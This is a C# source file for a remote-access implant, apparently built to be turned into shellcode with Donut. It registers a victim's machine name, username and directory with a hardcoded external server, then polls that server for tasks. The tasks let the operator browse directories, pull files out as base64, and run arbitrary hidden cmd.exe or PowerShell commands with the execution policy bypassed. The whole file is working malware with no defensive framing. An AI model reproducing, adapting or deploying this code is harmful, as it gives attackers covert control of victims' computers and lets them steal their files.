using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Diagnostics;

public class Runner
{
    // Точка входа для Donut
    public static void Start(string args)
    {
        string serverUrl = "https://soulinkkk1.pythonanywhere.com";
        string clientId = Guid.NewGuid().ToString().Substring(0, 8);
        MainLoop(serverUrl, clientId);
    }

    private static void MainLoop(string serverUrl, string clientId)
    {
        // Регистрация
        while (true)
        {
            try
            {
                string username = Environment.UserName;
                string cwd = Directory.GetCurrentDirectory();
                string info = $"{{\"client_id\":\"{clientId}\",\"hostname\":\"{Environment.MachineName}\",\"os\":\"windows\",\"username\":\"{username}\",\"cwd\":\"{cwd.Replace("\\", "\\\\")}\"}}";
                Transmit(serverUrl, "/api/register", info);
                break;
            }
            catch
            {
                Delay(5000);
            }
        }

        // Основной цикл задач
        while (true)
        {
            try
            {
                string raw = DownloadString(serverUrl + "/api/tasks/" + clientId);
                if (!string.IsNullOrEmpty(raw) && raw.Contains("\"id\""))
                {
                    string tid = Extract(raw, "\"id\":\"", "\"");
                    string cmd = Extract(raw, "\"command\":\"", "\"");
                    string arg = Extract(raw, "\"args\":\"", "\"");

                    string result = HandleTask(cmd, arg);
                    Transmit(serverUrl, "/api/results/" + clientId, "{\"task_id\":\"" + tid + "\",\"result\":" + result + "}");
                }
            }
            catch { }
            Delay(3000);
        }
    }

    private static string Transmit(string serverUrl, string path, string json)
    {
        // CRITICAL: Explicitly force the .NET runtime to utilize TLS 1.2 for the HTTPS connection.
        // The integer 3072 represents TLS 1.2 and works even if targeting older .NET versions.
        System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;

        var req = (HttpWebRequest)WebRequest.Create(serverUrl + path);
        req.Method = "POST";
        req.ContentType = "application/json";

        // Optional but highly recommended for public servers: 
        // Bypass proxy auto-detection to prevent 2-5 second delays on check-in.
        req.Proxy = null;

        byte[] data = Encoding.UTF8.GetBytes(json);
        req.ContentLength = data.Length;

        using (var stream = req.GetRequestStream())
            stream.Write(data, 0, data.Length);

        using (var resp = (HttpWebResponse)req.GetResponse())
        using (var sr = new StreamReader(resp.GetResponseStream()))
            return sr.ReadToEnd();
    }

    private static string DownloadString(string url)
    {
        var req = (HttpWebRequest)WebRequest.Create(url);
        req.Method = "GET";
        using (var resp = (HttpWebResponse)req.GetResponse())
        using (var sr = new StreamReader(resp.GetResponseStream()))
            return sr.ReadToEnd();
    }

    private static void Delay(int ms)
    {
        Thread.Sleep(ms);
    }

    private static string Extract(string source, string startStr, string endStr)
    {
        try
        {
            int start = source.IndexOf(startStr) + startStr.Length;
            int end = source.IndexOf(endStr, start);
            return source.Substring(start, end - start);
        }
        catch { return ""; }
    }

    private static string HandleTask(string cmd, string args)
    {
        try
        {
            switch ((cmd ?? "").ToLower())
            {
                case "ls":
                    string target = string.IsNullOrEmpty(args) ? "." : args;
                    StringBuilder sb = new StringBuilder("{\"path\":\"" + Path.GetFullPath(target).Replace("\\", "\\\\") + "\",\"entries\":[");
                    string[] dirs = Directory.GetDirectories(target);
                    string[] files = Directory.GetFiles(target);
                    foreach (var d in dirs)
                        sb.Append("{\"name\":\"" + Path.GetFileName(d) + "\",\"is_dir\":true},");
                    foreach (var f in files)
                        sb.Append("{\"name\":\"" + Path.GetFileName(f) + "\",\"is_dir\":false,\"size\":" + new FileInfo(f).Length + "},");
                    return sb.ToString().TrimEnd(',') + "]}";

                case "cd":
                    Directory.SetCurrentDirectory(args);
                    return "{\"output\":\"Changed to " + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\"}";

                case "pwd":
                    return "{\"output\":\"" + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\"}";

                case "download":
                    if (!File.Exists(args)) return "{\"error\":\"File not found\"}";
                    byte[] fileBytes = File.ReadAllBytes(args);
                    return "{\"filename\":\"" + Path.GetFileName(args) + "\",\"data_b64\":\"" + Convert.ToBase64String(fileBytes) + "\"}";

                case "ping":
                    return "{\"output\":\"pong\"}";

                case "cmd":
                    return RunProcess("cmd.exe", args);

                case "powershell":
                    return RunProcess("powershell.exe", args);

                default:
                    return "{\"error\":\"Unknown command\"}";
            }
        }
        catch (Exception e)
        {
            return "{\"error\":\"" + e.Message.Replace("\"", "'").Replace("\n", " ").Replace("\r", "") + "\"}";
        }
    }

    // Helper for CMD and PowerShell execution
    private static string RunProcess(string filename, string script)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = filename;

            // If it's CMD, we wrap the user's command with the UTF-8 switch
            if (filename.ToLower().Contains("cmd.exe"))
            {
                // Microsoft's 'Hidden' Rule: If you wrap the entire argument string in 
                // an extra set of outer quotes, CMD treats everything inside literally.
                // Decode CMD args just like PowerShell
                string cmdScript = Encoding.UTF8.GetString(Convert.FromBase64String(script));
                psi.Arguments = "/c \"chcp 65001 > nul && " + cmdScript + "\"";
            }
            else if (filename.ToLower().Contains("powershell"))
            {
                // For PowerShell, we already solved escaping by using Base64.
                // We just ensure the output stream is UTF8.
                string decodedScript = Encoding.UTF8.GetString(Convert.FromBase64String(script));
                psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " + decodedScript + "\"";
            }
            else
            {
                psi.Arguments = script;
            }

            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            // We set the C# reader to UTF8 to match the chcp 65001/PS settings
            psi.StandardOutputEncoding = Encoding.UTF8;
            psi.StandardErrorEncoding = Encoding.UTF8;

            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit();

                string combined = (output + error).Trim();

                // Critical escaping for JSON
                combined = combined.Replace("\\", "\\\\")
                                   .Replace("\"", "\\\"")
                                   .Replace("\n", "\\n")
                                   .Replace("\r", "\\r");

                return "{\"output\":\"" + combined + "\"}";
            }
        }
        catch (Exception ex)
        {
            return "{\"error\":\"Process error: " + ex.Message.Replace("\"", "'") + "\"}";
        }
    }
}